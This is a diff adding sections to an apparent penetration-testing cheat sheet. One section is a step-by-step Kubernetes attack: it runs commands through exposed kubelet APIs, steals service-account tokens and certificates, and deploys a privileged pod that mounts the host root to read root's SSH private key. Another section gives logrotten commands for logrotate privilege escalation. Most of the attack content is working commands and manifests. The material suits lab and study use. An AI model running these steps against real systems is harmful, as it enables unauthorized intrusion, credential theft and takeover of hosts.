@@ -2086,6 +2086,95 @@ Once inside redis environment `info` return information about the  server
 - `keys *` List all the keys in the database
 - `get {key}`
 
+### 6443 Kubernetes
+
+#### Generalities
+
+Kubernetes revolves around the concept of **pods**, which can hold one or  more closely connected containers. Each pod functions as a separate  virtual machine on a node, complete with its own IP, hostname..
+
+Kubernetes architecture is primarily divided into two types of components:
+
+- The Control Plane (master node), which is responsible for controlling the Kubernetes cluster
+- The Worker Nodes (minions), where the containerized applications are run
+
+The Control Plane serves as the management layer. It consists of:
+
+| **Service**             | **TCP Ports**  |
+| ----------------------- | -------------- |
+| `etcd`                  | `2379`, `2380` |
+| `API server`            | `6443`         |
+| `Scheduler`             | `10251`        |
+| `Controller Manager`    | `10252`        |
+| `Kubelet API`           | `10250`        |
+| `Read-Only Kubelet API` | `10255`        |
+
+The core of Kubernetes architecture is its API, which serves as the main point of contact for all internal and external interactions.
+
+#### Interaction
+
+- Extract PODS info
+
+  ```bash
+   curl https://<IP>:10250/pods -k | jq .
+   kubeletctl -i --server <IP> pods
+   kubeletctl -i --server <IP> scan rce
+  ```
+
+- Execute commands
+
+  ```bash
+  kubeletctl -i --server <IP> exec "id" -p nginx -c nginx
+  ```
+
+- Gain acces
+
+  ```bash
+  # Extract token
+  kubeletctl -i --server <IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
+  
+  # Extract certificate
+  kubeletctl --server <IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
+  
+  # List privileges
+  export token=`cat k8.token`
+  ubectl --token=$token --certificate-authority=ca.crt --server=https://<IP>:6443 auth can-i --list
+  ```
+
+  Given the privileges:
+
+  - **Create**: create a pod &rarr; create a `YAML` file  to create a new container and mount the entire root filesystem
+
+    ```yaml
+    apiVersion: v1
+    kind: Pod
+    metadata:
+      name: privesc
+      namespace: default
+    spec:
+      containers:
+      - name: privesc
+        image: nginx:1.14.2
+        volumeMounts:
+        - mountPath: /root
+          name: mount-root-into-mnt
+      volumes:
+      - name: mount-root-into-mnt
+        hostPath:
+           path: /
+      automountServiceAccountToken: true
+      hostNetwork: true
+    ```
+
+    Create the POD with the file:
+
+    ```bash
+    kubectl --token=$token --certificate-authority=ca.crt --server=https://<IP>:6443 apply -f privesc.yaml
+    # Check if running
+    kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods
+    # Run commands
+    kubeletctl --server <IP> exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
+    ```
+
 ### 9100 - Raw Printing
 
 Raw port 9100 printing, also referred to as JetDirect, AppSocket or PDL-datastream actually **is not a printing protocol by itself**. Instead **all data sent is directly processed by the printing device**, just like a parallel connection over TCP.
@@ -4217,8 +4306,22 @@ Forward a local service to a remote port. Usually used to gain shells or exchang
 
 ### Fundamentals
 
-- Execute bash script: `chmod +x [FILE]` &rarr; `./[FILE]`
-- Bash command (for broken shells) `bash -c "<command>"`
+- Terminal:
+
+  - Bash command (for broken shells) `bash -c "<command>"`
+
+  - While loop:
+
+    ```bash
+    while true; do commands; done
+    ```
+
+- Scipts:
+
+  - Bash header: `#!/bin/bash`
+  - Execute bash script: `chmod +x [FILE]` &rarr; `./[FILE]`
+  - C compile: `gcc file.c -o file` &rarr; `./file`
+
 
 ### Users & Privileges
 
@@ -4361,7 +4464,6 @@ Forward a local service to a remote port. Usually used to gain shells or exchang
   
     If you create a symlink to **/etc/passwd** in the same directory, then the owner of /etc/passwd will also be you.
   
-    
   
   Avoid checks:
   
@@ -4532,6 +4634,48 @@ Config Files:
 ps -aux | grep [USER, ROOT...]
 ```
 
+##### logrotate
+
+It archives or disposes of old logs. Conf file: `/etc/logrotate.conf`
+
+Requirements for [logrotten](https://github.com/whotwagner/logrotten):
+
+1.  write permissions on the log files
+
+    ```bash
+    find / -type f -writable 2>/dev/null | grep -i log
+    ```
+
+    You should find a file names `smth.log` and `smth.log.1`
+
+2. logrotate must run as a privileged user or `root`
+
+3. vulnerable versions:
+   - 3.8.6
+   - 3.11.0
+   - 3.15.0
+   - 3.18.0
+
+4. Determine option:
+
+   ```bash
+    grep "create\|compress" /etc/logrotate.conf | grep -v "#"
+   ```
+
+   - create
+
+     ```bash
+     ./logrotten -p ./payloadfile <smth.log>
+     ```
+
+   - compress
+
+     ```bash
+     ./logrotten -p ./payloadfile -c -s 4 <smth.log>
+     ```
+
+5. Try to trigger logrotate (e.g. writing smth.log)
+
 ##### tmux
 
 running tmux process &rarr; attach to it  [tmux-sessions](https://redfoxsec.com/blog/terminal-multiplexing-hijacking-tmux-sessions/) (try also without sudo)
@@ -4549,7 +4693,6 @@ running tmux process &rarr; attach to it  [tmux-sessions](https://redfoxsec.com/
 Each entry in the crontab file requires, in order: minutes, hours, days, months, weeks, commands. E.g, `0 */12 * * * /home/admin/backup.sh` would run every 12 hours.
 
 ```bash
-find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null | grep cron
 crontab -l
 ls -al /etc/cron* /etc/at*
 cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
